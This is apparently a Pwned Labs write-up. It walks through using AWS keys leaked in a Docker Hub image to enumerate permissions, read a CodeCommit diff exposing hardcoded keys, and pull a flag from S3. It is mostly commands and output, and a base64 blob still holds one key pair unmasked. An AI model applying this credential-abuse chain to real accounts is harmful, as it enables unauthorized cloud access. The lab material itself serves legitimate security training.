---
author: Nithissh
pubDatetime: 2025-01-31T10:22:00.000Z
title: "Uncover Secrets in CodeCommit and Docker"
featured: false
draft: false
tags:
  - pwnedlabs
description: "In this lab, we will see how the leaked credentials through dockerhub can be leveraged atmost and more further"
---

### Scenario


Huge Logistics has engaged your team for a security assessment. Your primary objective is to scrutinize their public repositories for overlooked credentials or sensitive information. If you discover any, use them to gain initial access to their cloud infrastructure. From there, focus on lateral and vertical movement to demonstrate impact. Your aim is to identify any security gaps so they can be closed off.

  

### Things provided in this lab 

|     |     |
| --- | --- |
| Type | Value |
| Docker search URL | [https://hub.docker.com/search](https://hub.docker.com/search) |

  

### Solution


Once after spinning the lab, we can see that they have provided with only docker search url and what else we can do.. what did was just gone to the dockerhub and search for `Huge Logistics` and landed upon the following repo 

  

![](/assets/images/uncover.png)

  

Rather than utilising some tools to scan the docker images and I thought why we can’t review it manually and looking into `tags` and found this only one version exists which is `0.12` and looking into further.. Found out the AWS credentials exists through the env variables 

  

![](/assets/images/uncover-2.png)

  

And so these are the credentials actually which we actuall retrieved through it and fun part is the same thing I did it same thing using trufflehog and we can’t able to find out and that’s how manually looking things works out

  

|     |     |
| --- | --- |
| **AWS Access Key** | AKIA_REDACTED_KEY_01 |
| **AWS Secret Key** | SECRET_KEY_REDACTED_01 |
| **Region** | us-east-1 |

  

After configuring these credentials, we can see that this credentials belongs to user called `prod-deploy` 

  

```sh
nits@FWS-CHE-LT-8869 ~ % aws configure --profile pwnedlabs-008
AWS Access Key ID [None]: AKIA_REDACTED_KEY_01
AWS Secret Access Key [None]: SECRET_KEY_REDACTED_01
Default region name [None]: us-east-1
Default output format [None]: 
nits@FWS-CHE-LT-8869 ~ % aws sts get-caller-identity --profile pwnedlabs-008
{
    "UserId": "AIDA3NRSK2PTAUXNEJTBN",
    "Account": "785010840550",
    "Arn": "arn:aws:iam::785010840450:user/prod-deploy"
}
```

  

In order to proceed further, we can utilise the tool called [awsenumerator](https://github.com/shabarkin/aws-enumerator "https://github.com/shabarkin/aws-enumerator") and you can install it using the following command 

  

```sh
go install -v github.com/shabarkin/aws-enumerator@latest
```

  

Using awsenumerator, you can setup the credentials with the following command 

  

```sh
nits@FWS-CHE-LT-8869 ~ % aws-enumerator cred -aws_access_key_id <access_key> -aws_region us-east-1  -aws_secret_access_key <aws_secret_key>
Message:  File .env with AWS credentials were created in current folder
```

  

Once after setting up the credentials, we can run the following command to enumerate and find on what services that these credentials have access to.. seeing the output we can confirm that it did have access to codecommit 

  

```sh
nits@FWS-CHE-LT-8869 ~ % aws-enumerator enum -services all
Message:  Successful APPMESH: 0 / 1
Message:  Successful ACM: 0 / 1
Message:  Successful AMPLIFY: 0 / 1
Message:  Successful APPSYNC: 0 / 1
Message:  Successful APIGATEWAY: 0 / 8
Message:  Successful ATHENA: 0 / 3
Message:  Successful BATCH: 0 / 4
Message:  Successful AUTOSCALING: 0 / 15
Message:  Successful CHIME: 0 / 1
Message:  Successful BACKUP: 0 / 7
Message:  Successful CLOUD9: 0 / 2
Message:  Successful CLOUDFRONT: 0 / 5
Message:  Successful CLOUDFORMATION: 0 / 8
Message:  Successful CLOUDDIRECTORY: 0 / 4
Message:  Successful CLOUDHSMV2: 0 / 2
Message:  Successful CLOUDTRAIL: 0 / 1
Message:  Successful CODEBUILD: 0 / 4
Message:  Successful CODECOMMIT: 1 / 2
```

  

> **AWS CodeCommit** is a private, secure Git-based code repository hosted on AWS, mainly for teams already using AWS services. It's designed for private, enterprise-level projects and integrates well with AWS tools.

  

Since we do have access to codecommit, we can list out the repositories inside codecommit with the following command: `aws codecommit list-repositories --profile pwnedlabs-008`⁠ and result showcases that it does has a repo called `vessel-tracking` 

  

```sh
nits@FWS-CHE-LT-8869 ~ % aws codecommit list-repositories --profile pwnedlabs-008
{
    "repositories": [
        {
            "repositoryName": "vessel-tracking",
            "repositoryId": "beb7df6c-e3a2-4094-8fc5-44451afc38d3"
        }
    ]
}
```

  

We can also get more info on that repo using `aws codecommit get-repository` 

  

```sh
nits@FWS-CHE-LT-8869 ~ % aws codecommit get-repository --repository-name vessel-tracking --profile pwnedlabs-008
{
    "repositoryMetadata": {
        "accountId": "785010840550",
        "repositoryId": "beb7df6c-e3a2-4094-8fc5-44451afc38d3",
        "repositoryName": "vessel-tracking",
        "repositoryDescription": "Vessel Tracking App",
        "defaultBranch": "master",
        "lastModifiedDate": 1689875446.826,
        "creationDate": 1689801079.845,
        "cloneUrlHttp": "https://git-codecommit.us-east-1.amazonaws.com/v1/repos/vessel-tracking",
        "cloneUrlSsh": "ssh://git-codecommit.us-east-1.amazonaws.com/v1/repos/vessel-tracking",
        "Arn": "arn:aws:codecommit:us-east-1:785010840550:vessel-tracking",
        "kmsKeyId": "alias/aws/codecommit"
    }
}
```

  

We can also list out branches using `aws codecommit list-branches`⁠ and we can see that, it does have two branches ( dev and master ) and master is by default exists and dev is something they have added 

  

```sh
nits@FWS-CHE-LT-8869 ~ % aws codecommit list-branches --repository-name vessel-tracking --profile pwnedlabs-008
{
    "branches": [
        "master",
        "dev"
    ]
}
```

  

Since, we found `dev` is something more interesting and we can look in for more detail 

  

```sh
nits@FWS-CHE-LT-8869 ~ % aws codecommit get-branch --repository-name vessel-tracking --branch-name dev --profile pwnedlabs-008
{
    "branch": {
        "branchName": "dev",
        "commitId": "b63f0756ce162a3928c4470681cf18dd2e4e2d5a"
    }
}
```

  

With the commit hash, we had from our previous step.. we can see that this commit clearly mentions on where made some changes related to s3 

  

```sh
nits@FWS-CHE-LT-8869 ~ % aws codecommit get-commit --repository-name vessel-tracking --commit-id b63f0756ce162a3928c4470681cf18dd2e4e2d5a --profile pwnedlabs-008

{
    "commit": {
        "commitId": "b63f0756ce162a3928c4470681cf18dd2e4e2d5a",
        "treeId": "5718a0915f230aa9dd0292e7f311cb53562bb885",
        "parents": [
            "2272b1b6860912aa3b042caf9ee3aaef58b19cb1"
        ],
        "message": "Allow S3 call to work universally\n",
        "author": {
            "name": "Jose Martinez",
            "email": "jose@pwnedlabs.io",
            "date": "1689875383 +0100"
        },
        "committer": {
            "name": "Jose Martinez",
            "email": "jose@pwnedlabs.io",
            "date": "1689875383 +0100"
        },
        "additionalData": ""
    }
}
```

  

Now since there is commit been made by jose and after commit hash is `b63f0756ce162a3928c4470681cf18dd2e4e2d5a` and before commit hash is `2272b1b6860912aa3b042caf9ee3aaef58b19cb1`⁠ we can compare both and see in which file they have made changes too

  

They made changes under `js/server.js` 

  

```sh
nits@FWS-CHE-LT-8869 ~ % aws codecommit get-differences --repository-name vessel-tracking --before-commit-specifier 2272b1b6860912aa3b042caf9ee3aaef58b19cb1 --after-commit-specifier b63f0756ce162a3928c4470681cf18dd2e4e2d5a --profile pwnedlabs-008
{
    "differences": [
        {
            "beforeBlob": {
                "blobId": "4381be5cc1992c598de5b7a6b73ebb438b79daba",
                "path": "js/server.js",
                "mode": "100644"
            },
            "afterBlob": {
                "blobId": "39bb76cad12f9f622b3c29c1d07c140e5292a276",
                "path": "js/server.js",
                "mode": "100644"
            },
            "changeType": "M"
        }
    ]
}
```

  

To get the file content of `js/server.js` with the commit hash of last updated ones, we can run the following command:

  

```sh
nits@FWS-CHE-LT-8869 ~ % aws codecommit get-file --repository-name vessel-tracking --commit-specifier b63f0756ce162a3928c4470681cf18dd2e4e2d5a --file-path js/server.js --profile pwnedlabs-008

{
    "commitId": "b63f0756ce162a3928c4470681cf18dd2e4e2d5a",
    "blobId": "39bb76cad12f9f622b3c29c1d07c140e5292a276",
    "filePath": "js/server.js",
    "fileMode": "NORMAL",
    "fileSize": 1702,
    "fileContent": "Y29uc3QgZXhwcmVzcyA9IHJlcXVpcmUoJ2V4cHJlc3MnKTsKY29uc3QgYXhpb3MgPSByZXF1aXJlKCdheGlvcycpOwpjb25zdCBBV1MgPSByZXF1aXJlKCdhd3Mtc2RrJyk7CmNvbnN0IHsgdjQ6IHV1aWR2NCB9ID0gcmVxdWlyZSgndXVpZCcpOwpyZXF1aXJlKCdkb3RlbnYnKS5jb25maWcoKTsKCmNvbnN0IGFwcCA9IGV4cHJlc3MoKTsKY29uc3QgUE9SVCA9IHByb2Nlc3MuZW52LlBPUlQgfHwgMzAwMDsKCi8vIEFXUyBTZXR1cApjb25zdCBBV1NfQUNDRVNTX0tFWSA9ICdBS0lBM05SU0syUFRMR0FXV0xURyc7CmNvbnN0IEFXU19TRUNSRVRfS0VZID0gJzJ3Vnd3NVZFQWM2NWVXV21oc3VVVXZGRVRUNyt5bVlHTGptZUNoYXMnOwoKQVdTLmNvbmZpZy51cGRhdGUoewogICAgcmVnaW9uOiAndXMtZWFzdC0xJywgIC8vIENoYW5nZSB0byB5b3VyIHJlZ2lvbgogICAgYWNjZXNzS2V5SWQ6IEFXU19BQ0NFU1NfS0VZLAogICAgc2VjcmV0QWNjZXNzS2V5OiBBV1NfU0VDUkVUX0tFWQp9KTsKY29uc3QgczMgPSBuZXcgQVdTLlMzKCk7CgphcHAudXNlKChyZXEsIHJlcywgbmV4dCkgPT4gewogICAgLy8gR2VuZXJhdGUgYSByZXF1ZXN0IElECiAgICByZXEucmVxdWVzdElEID0gdXVpZHY0KCk7CiAgICBuZXh0KCk7Cn0pOwoKYXBwLmdldCgnL3Zlc3NlbC86bXNzaScsIGFzeW5jIChyZXEsIHJlcykgPT4gewogICAgdHJ5IHsKICAgICAgICBjb25zdCBtc3NpID0gcmVxLnBhcmFtcy5tc3NpOwoKICAgICAgICAvLyBGZXRjaCBkYXRhIGZyb20gTWFyaW5lVHJhZmZpYyBBUEkKICAgICAgICBsZXQgcmVzcG9uc2UgPSBhd2FpdCBheGlvcy5nZXQoYGh0dHBzOi8vYXBpLm1hcmluZXRyYWZmaWMuY29tL3Zlc3NlbC8ke21zc2l9YCwgewogICAgICAgICAgICBoZWFkZXJzOiB7ICdBcGktS2V5JzogcHJvY2Vzcy5lbnYuTUFSSU5FX0FQSV9LRVkgfQogICAgICAgIH0pOwoKICAgICAgICBsZXQgZGF0YSA9IHJlc3BvbnNlLmRhdGE7IC8vIE1vZGlmeSBhcyBwZXIgYWN0dWFsIEFQSSByZXNwb25zZSBzdHJ1Y3R1cmUKCiAgICAgICAgLy8gVXBsb2FkIHRvIFMzCiAgICAgICAgbGV0IHBhcmFtcyA9IHsKICAgICAgICAgICAgQnVja2V0OiAndmVzc2VsLXRyYWNraW5nJywKICAgICAgICAgICAgS2V5OiBgJHttc3NpfS5qc29uYCwKICAgICAgICAgICAgQm9keTogSlNPTi5zdHJpbmdpZnkoZGF0YSksCiAgICAgICAgICAgIENvbnRlbnRUeXBlOiAiYXBwbGljYXRpb24vanNvbiIKICAgICAgICB9OwoKICAgICAgICBzMy5wdXRPYmplY3QocGFyYW1zLCBmdW5jdGlvbiAoZXJyLCBzM2RhdGEpIHsKICAgICAgICAgICAgaWYgKGVycikgcmV0dXJuIHJlcy5zdGF0dXMoNTAwKS5qc29uKGVycik7CiAgICAgICAgICAgIAogICAgICAgICAgICAvLyBTZW5kIGRhdGEgdG8gZnJvbnRlbmQKICAgICAgICAgICAgcmVzLmpzb24oewogICAgICAgICAgICAgICAgZGF0YSwKICAgICAgICAgICAgICAgIHJlcXVlc3RJRDogcmVxLnJlcXVlc3RJRAogICAgICAgICAgICB9KTsKICAgICAgICB9KTsKCiAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgIHJlcy5zdGF0dXMoNTAwKS5qc29uKHsgZXJyb3I6ICJFcnJvciBmZXRjaGluZyB2ZXNzZWwgZGF0YS4iIH0pOwogICAgfQp9KTsKCmFwcC5saXN0ZW4oUE9SVCwgKCkgPT4gewogICAgY29uc29sZS5sb2coYFNlcnZlciBpcyBydW5uaW5nIG9uIFBPUlQgJHtQT1JUfWApOwp9KTsKCg=="
```

  

We can see that the file content is in `base64` format and decoding it to reveals the actual content of `server.js` 

  

```js
const express = require('express');
const axios = require('axios');
const AWS = require('aws-sdk');
const { v4: uuidv4 } = require('uuid');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// AWS Setup
const AWS_ACCESS_KEY = 'AKIA************WLTH';
const AWS_SECRET_KEY = '2wVw************************Chas';

AWS.config.update({
    region: 'us-east-1',  // Change to your region
    accessKeyId: AWS_ACCESS_KEY,
    secretAccessKey: AWS_SECRET_KEY
});
const s3 = new AWS.S3();

app.use((req, res, next) => {
    // Generate a request ID
    req.requestID = uuidv4();
    next();
});

app.get('/vessel/:mssi', async (req, res) => {
    try {
        const mssi = req.params.mssi;

        // Fetch data from MarineTraffic API
        let response = await axios.get(`https://api.marinetraffic.com/vessel/${mssi}`, {
            headers: { 'Api-Key': process.env.MARINE_API_KEY }
        });

        let data = response.data; // Modify as per actual API response structure

        // Upload to S3
        let params = {
            Bucket: 'vessel-tracking',
            Key: `${mssi}.json`,
            Body: JSON.stringify(data),
            ContentType: "application/json"
        };

        s3.putObject(params, function (err, s3data) {
            if (err) return res.status(500).json(err);
            
            // Send data to frontend
            res.json({
                data,
                requestID: req.requestID
            });
        });

    } catch (error) {
        res.status(500).json({ error: "Error fetching vessel data." });
    }
});

app.listen(PORT, () => {
    console.log(`Server is running on PORT ${PORT}`);
});
```

  

Looking into above javascript file, filtered out these things to configure the AWS credentials and check whether these credentials have access to bucket mentioned 

  

|     |     |
| --- | --- |
| AWS Access key | AKIA************WLTG |
| AWS Secret Key | 2wVw************************Chas |
| Region | us-east-1 |
| Bucket name | vessel-tracking |

  

Once after configuring those credentials, we can see that we do have access to the bucket called `vessel-tracking` and we do have `flag.txt` exists inside it 

  

```sh
nits@FWS-CHE-LT-8869 ~ % aws configure --profile pwnedlabs-009
AWS Access Key ID [None]: AKIA************WWZH
AWS Secret Access Key [None]: 2wVw************************Chas
Default region name [None]: us-east-1
Default output format [None]: 
nits@FWS-CHE-LT-8869 ~ % aws s3 ls s3://vessel-tracking --profile pwnedlabs-009
2023-07-20 23:55:17         32 flag.txt
```

  

Just download flag.txt locally from s3 bucket and submit the content as solution and that solves the lab 

  

```sh
nits@FWS-CHE-LT-8869 ~ % aws s3 cp s3://vessel-tracking/flag.txt ./ --profile pwnedlabs-009
download: s3://vessel-tracking/flag.txt to ./flag.txt            
nits@FWS-CHE-LT-8869 ~ % cat flag.txt 
ab53301c2382ec87ed6f9ff78fec4b76% 
```